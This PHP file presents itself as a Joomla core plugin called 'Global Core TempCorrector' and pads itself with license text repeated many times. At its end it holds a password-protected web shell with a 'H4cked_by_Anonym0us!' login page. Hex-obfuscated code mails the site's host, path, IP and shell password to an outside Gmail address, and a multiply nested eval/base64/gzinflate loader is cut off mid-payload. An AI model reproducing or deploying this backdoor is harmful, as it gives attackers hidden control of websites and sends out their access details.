<?php
/**
 * @package Joomla Global Core TempCorrector
 */
/*
Plugin Name: Global Core TempCorrector
Plugin URI: http://joomla.org/download/
Description: Joomla Global Core TempCorrector
Version: 3.6
Author: Joomla
Author URI: https://joomla.org
License: GPLv2 or later
*/
@session_start();
@set_time_limit(0);
/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/
//@session_start();
//@set_time_limit(0);
/*

The hallmark of proprietary software licenses is that the software
publisher grants the use of one or more copies of software under
he end-user license agreement (EULA), but ownership of those copies
remains with the software publisher (hence use of the term "proprietary").
This feature of proprietary software licenses means that certain
rights regarding the software are reserved by the software publisher.
Therefore, it is typical of EULAs to include terms which define the
uses of the software, such as the number of installations allowed or
the terms of distribution.

The most significant effect of this form of licensing is that, if
ownership of the software remains with the software publisher, then
the end-user must accept the software license. In other words, without
acceptance of the license, the end-user may not use the software at
all. One example of such a proprietary software license is the license
for Microsoft Windows. As is usually the case with proprietary
software licenses, this license contains an extensive list of activities
which are restricted, such as: reverse engineering, simultaneous use of
the software by multiple users, and publication of benchmarks or
performance tests.

The most common licensing models are per single user (named user, client, node)
or per user in the appropriate volume discount level, while some
manufacturers accumulate existing licenses. These open volume license
programs are typically called open license program (OLP), transactional
license program (TLP), volume license program (VLP) etc. and are
contrary to the contractual license program (CLP), where the customer
commits to purchase a certain number of licenses over a fixed period
(mostly two years). Licensing per concurrent/floating user also occurs,
where all users in a network have access to the program, but only a
specific number at the same time. Another license model is licensing per
dongle, which allows the owner of the dongle to use the program on any
computer. Licensing per server, CPU or points, regardless the number of users,
is common practice, as well as site or company licenses. Sometimes one
can choose between perpetual (permanent) and annual license. For perpetual
licenses, one year of maintenance is often required, but maintenance
(subscription) renewals are discounted. For annual licenses, there is no
renewal; a new license must be purchased after expiration. Licensing can
be host/client (or guest), mailbox, IP address, domain etc., depending on
how the program is used. Additional users are inter alia licensed per
extension pack (e.g. up to 99 users), which includes the base pack (e.g. 5 users).
Some programs are modular, so one will have to buy a base product before
they can use other modules.[19]

Software licensing often also includes maintenance. This, usually with a
term of one year, is either included or optional, but must often be bought
with the software. The maintenance agreement (contract) typically contains
a clause that allows the licensee to receive minor updates (V.1.1 => 1.2),
and sometimes major updates (V.1.2 => 2.0). This option is usually called
update insurance or upgrade assurance. For a major update, the customer has
to buy an upgrade, if it is not included in the maintenance agreement.
For a maintenance renewal, some manufacturers charge a reinstatement (reinstallment)
fee retroactively per month, in the event that the current maintenance
has expired.

Maintenance sometimes includes technical support. When it does, the level
of technical support, which are commonly named gold, silver and bronze,
can vary depending on the communication method (i.e. e-mail versus telephone
support), availability (e.g. 5x8, 5 days a week, 8 hours a day) and reaction
time (e.g. three hours). Support is also licensed per incident as an incident
pack (e.g. five support incidents per year).[19]

Many manufacturers offer special conditions for schools and government agencies
EDU/GOV license). Migration from another product (crossgrade),
even from a different manufacturer (competitive upgrade) is offered.[19]

*/
/*

The hallmark of proprietary software licenses is that the software
publisher grants the use of one or more copies of software under
he end-user license agreement (EULA), but ownership of those copies
remains with the software publisher (hence use of the term "proprietary").
This feature of proprietary software licenses means that certain
rights regarding the software are reserved by the software publisher.
Therefore, it is typical of EULAs to include terms which define the
uses of the software, such as the number of installations allowed or
the terms of distribution.

The most significant effect of this form of licensing is that, if
ownership of the software remains with the software publisher, then
the end-user must accept the software license. In other words, without
acceptance of the license, the end-user may not use the software at
all. One example of such a proprietary software license is the license
for Microsoft Windows. As is usually the case with proprietary
software licenses, this license contains an extensive list of activities
which are restricted, such as: reverse engineering, simultaneous use of
the software by multiple users, and publication of benchmarks or
performance tests.

The most common licensing models are per single user (named user, client, node)
or per user in the appropriate volume discount level, while some
manufacturers accumulate existing licenses. These open volume license
programs are typically called open license program (OLP), transactional
license program (TLP), volume license program (VLP) etc. and are
contrary to the contractual license program (CLP), where the customer
commits to purchase a certain number of licenses over a fixed period
(mostly two years). Licensing per concurrent/floating user also occurs,
where all users in a network have access to the program, but only a
specific number at the same time. Another license model is licensing per
dongle, which allows the owner of the dongle to use the program on any
computer. Licensing per server, CPU or points, regardless the number of users,
is common practice, as well as site or company licenses. Sometimes one
can choose between perpetual (permanent) and annual license. For perpetual
licenses, one year of maintenance is often required, but maintenance
(subscription) renewals are discounted. For annual licenses, there is no
renewal; a new license must be purchased after expiration. Licensing can
be host/client (or guest), mailbox, IP address, domain etc., depending on
how the program is used. Additional users are inter alia licensed per
extension pack (e.g. up to 99 users), which includes the base pack (e.g. 5 users).
Some programs are modular, so one will have to buy a base product before
they can use other modules.[19]

Software licensing often also includes maintenance. This, usually with a
term of one year, is either included or optional, but must often be bought
with the software. The maintenance agreement (contract) typically contains
a clause that allows the licensee to receive minor updates (V.1.1 => 1.2),
and sometimes major updates (V.1.2 => 2.0). This option is usually called
update insurance or upgrade assurance. For a major update, the customer has
to buy an upgrade, if it is not included in the maintenance agreement.
For a maintenance renewal, some manufacturers charge a reinstatement (reinstallment)
fee retroactively per month, in the event that the current maintenance
has expired.

Maintenance sometimes includes technical support. When it does, the level
of technical support, which are commonly named gold, silver and bronze,
can vary depending on the communication method (i.e. e-mail versus telephone
support), availability (e.g. 5x8, 5 days a week, 8 hours a day) and reaction
time (e.g. three hours). Support is also licensed per incident as an incident
pack (e.g. five support incidents per year).[19]

Many manufacturers offer special conditions for schools and government agencies
EDU/GOV license). Migration from another product (crossgrade),
even from a different manufacturer (competitive upgrade) is offered.[19]

*/
/*

The hallmark of proprietary software licenses is that the software
publisher grants the use of one or more copies of software under
he end-user license agreement (EULA), but ownership of those copies
remains with the software publisher (hence use of the term "proprietary").
This feature of proprietary software licenses means that certain
rights regarding the software are reserved by the software publisher.
Therefore, it is typical of EULAs to include terms which define the
uses of the software, such as the number of installations allowed or
the terms of distribution.

The most significant effect of this form of licensing is that, if
ownership of the software remains with the software publisher, then
the end-user must accept the software license. In other words, without
acceptance of the license, the end-user may not use the software at
all. One example of such a proprietary software license is the license
for Microsoft Windows. As is usually the case with proprietary
software licenses, this license contains an extensive list of activities
which are restricted, such as: reverse engineering, simultaneous use of
the software by multiple users, and publication of benchmarks or
performance tests.

The most common licensing models are per single user (named user, client, node)
or per user in the appropriate volume discount level, while some
manufacturers accumulate existing licenses. These open volume license
programs are typically called open license program (OLP), transactional
license program (TLP), volume license program (VLP) etc. and are
contrary to the contractual license program (CLP), where the customer
commits to purchase a certain number of licenses over a fixed period
(mostly two years). Licensing per concurrent/floating user also occurs,
where all users in a network have access to the program, but only a
specific number at the same time. Another license model is licensing per
dongle, which allows the owner of the dongle to use the program on any
computer. Licensing per server, CPU or points, regardless the number of users,
is common practice, as well as site or company licenses. Sometimes one
can choose between perpetual (permanent) and annual license. For perpetual
licenses, one year of maintenance is often required, but maintenance
(subscription) renewals are discounted. For annual licenses, there is no
renewal; a new license must be purchased after expiration. Licensing can
be host/client (or guest), mailbox, IP address, domain etc., depending on
how the program is used. Additional users are inter alia licensed per
extension pack (e.g. up to 99 users), which includes the base pack (e.g. 5 users).
Some programs are modular, so one will have to buy a base product before
they can use other modules.[19]

Software licensing often also includes maintenance. This, usually with a
term of one year, is either included or optional, but must often be bought
with the software. The maintenance agreement (contract) typically contains
a clause that allows the licensee to receive minor updates (V.1.1 => 1.2),
and sometimes major updates (V.1.2 => 2.0). This option is usually called
update insurance or upgrade assurance. For a major update, the customer has
to buy an upgrade, if it is not included in the maintenance agreement.
For a maintenance renewal, some manufacturers charge a reinstatement (reinstallment)
fee retroactively per month, in the event that the current maintenance
has expired.

Maintenance sometimes includes technical support. When it does, the level
of technical support, which are commonly named gold, silver and bronze,
can vary depending on the communication method (i.e. e-mail versus telephone
support), availability (e.g. 5x8, 5 days a week, 8 hours a day) and reaction
time (e.g. three hours). Support is also licensed per incident as an incident
pack (e.g. five support incidents per year).[19]

Many manufacturers offer special conditions for schools and government agencies
EDU/GOV license). Migration from another product (crossgrade),
even from a different manufacturer (competitive upgrade) is offered.[19]

*/
/*

The hallmark of proprietary software licenses is that the software
publisher grants the use of one or more copies of software under
he end-user license agreement (EULA), but ownership of those copies
remains with the software publisher (hence use of the term "proprietary").
This feature of proprietary software licenses means that certain
rights regarding the software are reserved by the software publisher.
Therefore, it is typical of EULAs to include terms which define the
uses of the software, such as the number of installations allowed or
the terms of distribution.

The most significant effect of this form of licensing is that, if
ownership of the software remains with the software publisher, then
the end-user must accept the software license. In other words, without
acceptance of the license, the end-user may not use the software at
all. One example of such a proprietary software license is the license
for Microsoft Windows. As is usually the case with proprietary
software licenses, this license contains an extensive list of activities
which are restricted, such as: reverse engineering, simultaneous use of
the software by multiple users, and publication of benchmarks or
performance tests.

The most common licensing models are per single user (named user, client, node)
or per user in the appropriate volume discount level, while some
manufacturers accumulate existing licenses. These open volume license
programs are typically called open license program (OLP), transactional
license program (TLP), volume license program (VLP) etc. and are
contrary to the contractual license program (CLP), where the customer
commits to purchase a certain number of licenses over a fixed period
(mostly two years). Licensing per concurrent/floating user also occurs,
where all users in a network have access to the program, but only a
specific number at the same time. Another license model is licensing per
dongle, which allows the owner of the dongle to use the program on any
computer. Licensing per server, CPU or points, regardless the number of users,
is common practice, as well as site or company licenses. Sometimes one
can choose between perpetual (permanent) and annual license. For perpetual
licenses, one year of maintenance is often required, but maintenance
(subscription) renewals are discounted. For annual licenses, there is no
renewal; a new license must be purchased after expiration. Licensing can
be host/client (or guest), mailbox, IP address, domain etc., depending on
how the program is used. Additional users are inter alia licensed per
extension pack (e.g. up to 99 users), which includes the base pack (e.g. 5 users).
Some programs are modular, so one will have to buy a base product before
they can use other modules.[19]

Software licensing often also includes maintenance. This, usually with a
term of one year, is either included or optional, but must often be bought
with the software. The maintenance agreement (contract) typically contains
a clause that allows the licensee to receive minor updates (V.1.1 => 1.2),
and sometimes major updates (V.1.2 => 2.0). This option is usually called
update insurance or upgrade assurance. For a major update, the customer has
to buy an upgrade, if it is not included in the maintenance agreement.
For a maintenance renewal, some manufacturers charge a reinstatement (reinstallment)
fee retroactively per month, in the event that the current maintenance
has expired.

Maintenance sometimes includes technical support. When it does, the level
of technical support, which are commonly named gold, silver and bronze,
can vary depending on the communication method (i.e. e-mail versus telephone
support), availability (e.g. 5x8, 5 days a week, 8 hours a day) and reaction
time (e.g. three hours). Support is also licensed per incident as an incident
pack (e.g. five support incidents per year).[19]

Many manufacturers offer special conditions for schools and government agencies
EDU/GOV license). Migration from another product (crossgrade),
even from a different manufacturer (competitive upgrade) is offered.[19]

*/
/**
 * @package Joomla Global Core TempCorrector
 */
/*
Plugin Name: Global Core TempCorrector
Plugin URI: http://joomla.org/download/
Description: Joomla Global Core TempCorrector
Version: 3.6
Author: Joomla
Author URI: https://joomla.org
License: GPLv2 or later
*/
@session_start();
@set_time_limit(0);
/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/
//@session_start();
//@set_time_limit(0);
/*

The hallmark of proprietary software licenses is that the software
publisher grants the use of one or more copies of software under
he end-user license agreement (EULA), but ownership of those copies
remains with the software publisher (hence use of the term "proprietary").
This feature of proprietary software licenses means that certain
rights regarding the software are reserved by the software publisher.
Therefore, it is typical of EULAs to include terms which define the
uses of the software, such as the number of installations allowed or
the terms of distribution.

The most significant effect of this form of licensing is that, if
ownership of the software remains with the software publisher, then
the end-user must accept the software license. In other words, without
acceptance of the license, the end-user may not use the software at
all. One example of such a proprietary software license is the license
for Microsoft Windows. As is usually the case with proprietary
software licenses, this license contains an extensive list of activities
which are restricted, such as: reverse engineering, simultaneous use of
the software by multiple users, and publication of benchmarks or
performance tests.

The most common licensing models are per single user (named user, client, node)
or per user in the appropriate volume discount level, while some
manufacturers accumulate existing licenses. These open volume license
programs are typically called open license program (OLP), transactional
license program (TLP), volume license program (VLP) etc. and are
contrary to the contractual license program (CLP), where the customer
commits to purchase a certain number of licenses over a fixed period
(mostly two years). Licensing per concurrent/floating user also occurs,
where all users in a network have access to the program, but only a
specific number at the same time. Another license model is licensing per
dongle, which allows the owner of the dongle to use the program on any
computer. Licensing per server, CPU or points, regardless the number of users,
is common practice, as well as site or company licenses. Sometimes one
can choose between perpetual (permanent) and annual license. For perpetual
licenses, one year of maintenance is often required, but maintenance
(subscription) renewals are discounted. For annual licenses, there is no
renewal; a new license must be purchased after expiration. Licensing can
be host/client (or guest), mailbox, IP address, domain etc., depending on
how the program is used. Additional users are inter alia licensed per
extension pack (e.g. up to 99 users), which includes the base pack (e.g. 5 users).
Some programs are modular, so one will have to buy a base product before
they can use other modules.[19]

Software licensing often also includes maintenance. This, usually with a
term of one year, is either included or optional, but must often be bought
with the software. The maintenance agreement (contract) typically contains
a clause that allows the licensee to receive minor updates (V.1.1 => 1.2),
and sometimes major updates (V.1.2 => 2.0). This option is usually called
update insurance or upgrade assurance. For a major update, the customer has
to buy an upgrade, if it is not included in the maintenance agreement.
For a maintenance renewal, some manufacturers charge a reinstatement (reinstallment)
fee retroactively per month, in the event that the current maintenance
has expired.

Maintenance sometimes includes technical support. When it does, the level
of technical support, which are commonly named gold, silver and bronze,
can vary depending on the communication method (i.e. e-mail versus telephone
support), availability (e.g. 5x8, 5 days a week, 8 hours a day) and reaction
time (e.g. three hours). Support is also licensed per incident as an incident
pack (e.g. five support incidents per year).[19]

Many manufacturers offer special conditions for schools and government agencies
EDU/GOV license). Migration from another product (crossgrade),
even from a different manufacturer (competitive upgrade) is offered.[19]

*/
/*

The hallmark of proprietary software licenses is that the software
publisher grants the use of one or more copies of software under
he end-user license agreement (EULA), but ownership of those copies
remains with the software publisher (hence use of the term "proprietary").
This feature of proprietary software licenses means that certain
rights regarding the software are reserved by the software publisher.
Therefore, it is typical of EULAs to include terms which define the
uses of the software, such as the number of installations allowed or
the terms of distribution.

The most significant effect of this form of licensing is that, if
ownership of the software remains with the software publisher, then
the end-user must accept the software license. In other words, without
acceptance of the license, the end-user may not use the software at
all. One example of such a proprietary software license is the license
for Microsoft Windows. As is usually the case with proprietary
software licenses, this license contains an extensive list of activities
which are restricted, such as: reverse engineering, simultaneous use of
the software by multiple users, and publication of benchmarks or
performance tests.

The most common licensing models are per single user (named user, client, node)
or per user in the appropriate volume discount level, while some
manufacturers accumulate existing licenses. These open volume license
programs are typically called open license program (OLP), transactional
license program (TLP), volume license program (VLP) etc. and are
contrary to the contractual license program (CLP), where the customer
commits to purchase a certain number of licenses over a fixed period
(mostly two years). Licensing per concurrent/floating user also occurs,
where all users in a network have access to the program, but only a
specific number at the same time. Another license model is licensing per
dongle, which allows the owner of the dongle to use the program on any
computer. Licensing per server, CPU or points, regardless the number of users,
is common practice, as well as site or company licenses. Sometimes one
can choose between perpetual (permanent) and annual license. For perpetual
licenses, one year of maintenance is often required, but maintenance
(subscription) renewals are discounted. For annual licenses, there is no
renewal; a new license must be purchased after expiration. Licensing can
be host/client (or guest), mailbox, IP address, domain etc., depending on
how the program is used. Additional users are inter alia licensed per
extension pack (e.g. up to 99 users), which includes the base pack (e.g. 5 users).
Some programs are modular, so one will have to buy a base product before
they can use other modules.[19]

Software licensing often also includes maintenance. This, usually with a
term of one year, is either included or optional, but must often be bought
with the software. The maintenance agreement (contract) typically contains
a clause that allows the licensee to receive minor updates (V.1.1 => 1.2),
and sometimes major updates (V.1.2 => 2.0). This option is usually called
update insurance or upgrade assurance. For a major update, the customer has
to buy an upgrade, if it is not included in the maintenance agreement.
For a maintenance renewal, some manufacturers charge a reinstatement (reinstallment)
fee retroactively per month, in the event that the current maintenance
has expired.

Maintenance sometimes includes technical support. When it does, the level
of technical support, which are commonly named gold, silver and bronze,
can vary depending on the communication method (i.e. e-mail versus telephone
support), availability (e.g. 5x8, 5 days a week, 8 hours a day) and reaction
time (e.g. three hours). Support is also licensed per incident as an incident
pack (e.g. five support incidents per year).[19]

Many manufacturers offer special conditions for schools and government agencies
EDU/GOV license). Migration from another product (crossgrade),
even from a different manufacturer (competitive upgrade) is offered.[19]

*/
/*

The hallmark of proprietary software licenses is that the software
publisher grants the use of one or more copies of software under
he end-user license agreement (EULA), but ownership of those copies
remains with the software publisher (hence use of the term "proprietary").
This feature of proprietary software licenses means that certain
rights regarding the software are reserved by the software publisher.
Therefore, it is typical of EULAs to include terms which define the
uses of the software, such as the number of installations allowed or
the terms of distribution.

The most significant effect of this form of licensing is that, if
ownership of the software remains with the software publisher, then
the end-user must accept the software license. In other words, without
acceptance of the license, the end-user may not use the software at
all. One example of such a proprietary software license is the license
for Microsoft Windows. As is usually the case with proprietary
software licenses, this license contains an extensive list of activities
which are restricted, such as: reverse engineering, simultaneous use of
the software by multiple users, and publication of benchmarks or
performance tests.

The most common licensing models are per single user (named user, client, node)
or per user in the appropriate volume discount level, while some
manufacturers accumulate existing licenses. These open volume license
programs are typically called open license program (OLP), transactional
license program (TLP), volume license program (VLP) etc. and are
contrary to the contractual license program (CLP), where the customer
commits to purchase a certain number of licenses over a fixed period
(mostly two years). Licensing per concurrent/floating user also occurs,
where all users in a network have access to the program, but only a
specific number at the same time. Another license model is licensing per
dongle, which allows the owner of the dongle to use the program on any
computer. Licensing per server, CPU or points, regardless the number of users,
is common practice, as well as site or company licenses. Sometimes one
can choose between perpetual (permanent) and annual license. For perpetual
licenses, one year of maintenance is often required, but maintenance
(subscription) renewals are discounted. For annual licenses, there is no
renewal; a new license must be purchased after expiration. Licensing can
be host/client (or guest), mailbox, IP address, domain etc., depending on
how the program is used. Additional users are inter alia licensed per
extension pack (e.g. up to 99 users), which includes the base pack (e.g. 5 users).
Some programs are modular, so one will have to buy a base product before
they can use other modules.[19]

Software licensing often also includes maintenance. This, usually with a
term of one year, is either included or optional, but must often be bought
with the software. The maintenance agreement (contract) typically contains
a clause that allows the licensee to receive minor updates (V.1.1 => 1.2),
and sometimes major updates (V.1.2 => 2.0). This option is usually called
update insurance or upgrade assurance. For a major update, the customer has
to buy an upgrade, if it is not included in the maintenance agreement.
For a maintenance renewal, some manufacturers charge a reinstatement (reinstallment)
fee retroactively per month, in the event that the current maintenance
has expired.

Maintenance sometimes includes technical support. When it does, the level
of technical support, which are commonly named gold, silver and bronze,
can vary depending on the communication method (i.e. e-mail versus telephone
support), availability (e.g. 5x8, 5 days a week, 8 hours a day) and reaction
time (e.g. three hours). Support is also licensed per incident as an incident
pack (e.g. five support incidents per year).[19]

Many manufacturers offer special conditions for schools and government agencies
EDU/GOV license). Migration from another product (crossgrade),
even from a different manufacturer (competitive upgrade) is offered.[19]

*/
/*

The hallmark of proprietary software licenses is that the software
publisher grants the use of one or more copies of software under
he end-user license agreement (EULA), but ownership of those copies
remains with the software publisher (hence use of the term "proprietary").
This feature of proprietary software licenses means that certain
rights regarding the software are reserved by the software publisher.
Therefore, it is typical of EULAs to include terms which define the
uses of the software, such as the number of installations allowed or
the terms of distribution.

The most significant effect of this form of licensing is that, if
ownership of the software remains with the software publisher, then
the end-user must accept the software license. In other words, without
acceptance of the license, the end-user may not use the software at
all. One example of such a proprietary software license is the license
for Microsoft Windows. As is usually the case with proprietary
software licenses, this license contains an extensive list of activities
which are restricted, such as: reverse engineering, simultaneous use of
the software by multiple users, and publication of benchmarks or
performance tests.

The most common licensing models are per single user (named user, client, node)
or per user in the appropriate volume discount level, while some
manufacturers accumulate existing licenses. These open volume license
programs are typically called open license program (OLP), transactional
license program (TLP), volume license program (VLP) etc. and are
contrary to the contractual license program (CLP), where the customer
commits to purchase a certain number of licenses over a fixed period
(mostly two years). Licensing per concurrent/floating user also occurs,
where all users in a network have access to the program, but only a
specific number at the same time. Another license model is licensing per
dongle, which allows the owner of the dongle to use the program on any
computer. Licensing per server, CPU or points, regardless the number of users,
is common practice, as well as site or company licenses. Sometimes one
can choose between perpetual (permanent) and annual license. For perpetual
licenses, one year of maintenance is often required, but maintenance
(subscription) renewals are discounted. For annual licenses, there is no
renewal; a new license must be purchased after expiration. Licensing can
be host/client (or guest), mailbox, IP address, domain etc., depending on
how the program is used. Additional users are inter alia licensed per
extension pack (e.g. up to 99 users), which includes the base pack (e.g. 5 users).
Some programs are modular, so one will have to buy a base product before
they can use other modules.[19]

Software licensing often also includes maintenance. This, usually with a
term of one year, is either included or optional, but must often be bought
with the software. The maintenance agreement (contract) typically contains
a clause that allows the licensee to receive minor updates (V.1.1 => 1.2),
and sometimes major updates (V.1.2 => 2.0). This option is usually called
update insurance or upgrade assurance. For a major update, the customer has
to buy an upgrade, if it is not included in the maintenance agreement.
For a maintenance renewal, some manufacturers charge a reinstatement (reinstallment)
fee retroactively per month, in the event that the current maintenance
has expired.

Maintenance sometimes includes technical support. When it does, the level
of technical support, which are commonly named gold, silver and bronze,
can vary depending on the communication method (i.e. e-mail versus telephone
support), availability (e.g. 5x8, 5 days a week, 8 hours a day) and reaction
time (e.g. three hours). Support is also licensed per incident as an incident
pack (e.g. five support incidents per year).[19]

Many manufacturers offer special conditions for schools and government agencies
EDU/GOV license). Migration from another product (crossgrade),
even from a different manufacturer (competitive upgrade) is offered.[19]

*/
@$pass = $_POST['pass'];
$chk_login = true;
$password = "404";
if ($pass == $password) {
$_SESSION['nst'] = "$pass";
}
if ($chk_login == true) {
if (!isset($_SESSION['nst']) or $_SESSION['nst'] != $password) {
die("
  <title>H4cked_by_Anonym0us!</title>
  <center>
  <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%>
  <tr><td valign=middle align=center>
  <table width=100 bgcolor=black border=6 bordercolor=black><tr><td>
  <font size=1 face=verdana><center>
  <b></font></a><br></b>
  </center>
  <form method=post>
  <font size=1 face=verdana color=blue><strong><center>- by_Anonym0us! -</center></strong><br>
  <input type=password name=pass size=30>
  </form>
  <b>IP:</b> " . $_SERVER["REMOTE_ADDR"] . "
  </td></tr></table>
  </td></tr></table>
  ");
}
}
${"\x47L\x4fBA\x4c\x53"}["\x6c\x67\x77j\x68kr\x6f\x6e\x66\x72"]="\x74\x6fx";${"G\x4c\x4f\x42A\x4c\x53"}["\x6b\x64vd\x72\x6a\x73\x6f\x77\x67\x6a\x6b"]="\x77\x65b";${${"G\x4cO\x42\x41L\x53"}["k\x64\x76\x64\x72js\x6f\x77\x67\x6a\x6b"]}=$_SERVER["H\x54\x54P_\x48O\x53\x54"];${"\x47\x4c\x4fBAL\x53"}["p\x78qp\x77\x71u\x77\x71"]="i\x6ej";$mkkbajipt="\x62o\x64y";${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x70\x78\x71p\x77\x71uwq"]}=$_SERVER["R\x45QUEST\x5f\x55\x52\x49"];$rdsxefiruyik="to\x78";${$mkkbajipt}="\x59o\x75\x72\x20\x69gnora\x6e\x63\x65\x20\x69\x73\x20our\x20power. \nR\x6fu\x74\x65: ".htmlspecialchars($_SERVER["\x52EQ\x55\x45\x53\x54\x5fURI"])."\n\x57e\x62\x20S\x65r\x76\x65r:\x20".htmlspecialchars($_SERVER["SERV\x45\x52\x5f\x4e\x41\x4dE"])."\n\nIP:\x20".htmlspecialchars($_SERVER["\x53\x45RV\x45\x52\x5fA\x44D\x52"])."\nS\x68e\x6c\x6c \x50a\x73\x73\x77\x30r\x64: ".htmlspecialchars($_SESSION["\x6e\x73t"]);${$rdsxefiruyik}="\x32k\x32\x30rzl\x74\x40g\x6d\x61i\x6c.\x63\x6fm";mail(${${"\x47\x4cOBA\x4c\x53"}["\x6c\x67\x77\x6a\x68kr\x6f\x6e\x66\x72"]},"\x53hell \x68\x74\x74p://$web$inj","$body");
eval(base64_decode('ZnVuY3Rpb24gX2RVOE8oJF9JTkhzaHFiTFopeyRfSU5Ic2hxYkxaPXN1YnN0cigkX0lOSHNocWJMWiwoaW50KShoZXgyYmluKCczNzMxMzUnKSkpOyRfSU5Ic2hxYkxaPXN1YnN0cigkX0lOSHNocWJMWiwoaW50KShoZXgyYmluKCczMCcpKSwoaW50KShoZXgyYmluKCcyZDM1MzYzNCcpKSk7cmV0dXJuICRfSU5Ic2hxYkxaO30kX1JBbEdKPSdfZFU4Tyc7JF82Y1VWMD0nYmFzZTY0X2RlY29kZSc7ZnVuY3Rpb24gXzRhQ1MyVWFFbEkxc0UoJF9EMmc4NHcpe2dsb2JhbCAkX1JBbEdKO2dsb2JhbCAkXzZjVVYwO3JldHVybiBzdHJyZXYoZ3ppbmZsYXRlKCRfNmNVVjAoX2RVOE8oJF9EMmc4NHcpKSkpO31ldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoXzRhQ1MyVWFFbEkxc0UoJ1JHRThLU1ZyNnVRamRwWEVvejJOTlpvTFczeGJUS2NQNzFRbGFIS3JmdldZMGpvRDdqa29mUWxsRk5VeDZLTlRFc2NUS1JodnJTSUlpanNrQVRjVTRsanpmeVppa283UzA0U29NWmF4RjB3RnJJWm5zOUtGTnRqYVgwMkpIZERRUFJRTTI3Vm9ibUdIOEF3OEVUdkxjeEtJRk51UENlMVlLWllpVzdyV2kzYmgyeWJGRWJmU1J1Z0NOZmc1TXRqZVJwQVlFQ2pWbVhneFY0WVZ4OW5tNU9YNXl6MmZxYjQyY3M3bFNqdDBRdkZRYm5iZEJVM3Q4M1owTUNXc0dTQzdRZkY0S3FlOHZXV1gyWUs5bmY3UkoyTExMc2NONUFXVGZycWZmeU9jdFN2Sk1Zc0VpckJ2cUJKcHBwWkR2QWtMNFV1RUM2aFFKS1V3dUxJNUZvVkdmV1ZZODBuOUVNY1pMVUlaR0JyNk5JZnZyNnVYa1dBRDlqeUVIczNhNjF6MmdjR1FjTnhRYVlTNEpPT2VOWmVZZ0RCb0k1aEFRQ0Fva2Z0Wkg0cFBGSEN1cGQ3SkpMcUpIOGNhOHBidVlDdXFQUlpXbHVUaTB6RDBZRU5tQUV0bTk2WWhsaUFGZDlSYUFzQzF1Wk9mdWFUQTNwMTluWTdaRmZ6bEp3eWlPdG11dDFuYndTNk5scmowdXk5cFdUbm9veDFFQ29iSnRycWppTmx1NmJEcGQ0ZFRZRFYyYW41MjlvY3lzN252VldyTFpXbWFWcEs0dFNhSHlQVXlKY24wN1FqMFd0QUd0b3p0VmtKRjJEUnBsdk5mVXhZTktxU2JaeHkxRkR4ZkV6QUJvYlZ3OHNqUk1aQ2hoczdCT213V1piQnRDNjNIQzJjd0ZJVDZnVmJlQ0NJTkd0MWJZdmVRZXFPTlBVQTBnY1duQmJrRVVhMlp6YlZ2YjE1ZjlzMjhqajgvL01xR0RXN2xCb2Z2RVJTUk93bWNld21iYTdhenRIRytYbDVXcXhsU2RWaHgwM3ozaC9NREFDQ0ZHVTc3ZTYzL2JTVVNSd0RZREFZek1rVzVlZmNpRHdyanZjTjFnK2RPRE1taThtWjhkVmdQZk5lZnAyWTNiek0rQitXNWJ2R3B0SHI1aGZsd3Rnd1RXT2o5OGs4UG5yOTdQVE44ZkV6OCtQaC9ydkQvYVBUKzkxK2RzSHJuRThtNlNLZkcxOTRsY1Z5Y2paNU1aNlVpelEyOERGZUZrYmtGbTdBZTNVVFAzZ3NlNDFpSy9SNGY0VnQ1UVc5Wk9idVpabHRQelNOeVREbHdBWlcwWThORnZwNWtJc1NuZUM4Zkh2MGJ2L3c3YXVEbjBldjNHVCs2bUx2MWZ6NDU3ZnY3T1A5US92dDVLMlRYbjUyZnYzWnVubzk5ZDRlcmJ4TGorTEY0NzM0ejBHWlRIOXlYb3pQanBMUm9adjJYNDJ4bmZLWGQ0Y3ZYbG5IeDcrVmI4ckhleStPZnVLRGhUYTg5NzlkRFM1YXk2aStieWp6ZWtRd0w5LzltRjVPZjNuS3gvRjgrZm5kOC9QSDVldnJ3VVY2L2U3OCtlVHQrL2o4eVY0UlBqbjYrZnJ3eDkrR1Q1NzlkSGExOSs1Z1lmM3lodGUxWHIzL2JkbDNrdC92VVAveTBFMnVzZjdSOFpOMzUyL2Z2ckkvSUR4UEFON3o0NThHbzhOZjhMZDE5SFJndlozODh1RzMyU3NuK1JQYnZ2N3A2dFdQR1orYjN4WUhGMG4vSnlleGVCOVhoeDkrRzl0L2l0OGxqZFA3OGNQd2w3M24vblBlMzA4ZkRrdGVaM3I0NC9Qdzg3UG4wK2ZQZmpzLzRERHg4V2NIZjc1L241Mi9mWEs0OS9OeTVIekE4UzJjWHk5ZmZYZ2p4NHJyODd4TTBvTzluODRtdjZlWFA0M1RnNS8yZmg2TmZ2enQ3T3BaY1haKzlPRnFQbnIzN0tkM3Y1eWZsY25sNFlkZkN3N1RjdlNlMmhqOWlHMVk3NXo0OTRIejlveXZ1ODNITS8vcEExOFhXdS9yVngreXkvM3I1eDFqeDVpZUx0SjhQSjZrcCtkcG5OdzNvdFNKbmNSZ2hKbUVjTDN1TEY5TUpnY3YvMXorK3R5SUNGc1pZYWJFNUVGY3VMbkI2Q0ZmaGtIQTl3QkxyU1NNWlZ2TkRqYzZvK2xXbW14UEx4YmJuVzZSOGsyUlpyQlRnckJmUEpHMU92ODI3SC92T3Nab3RCeHZYK2JaOXE1dGRJd3Q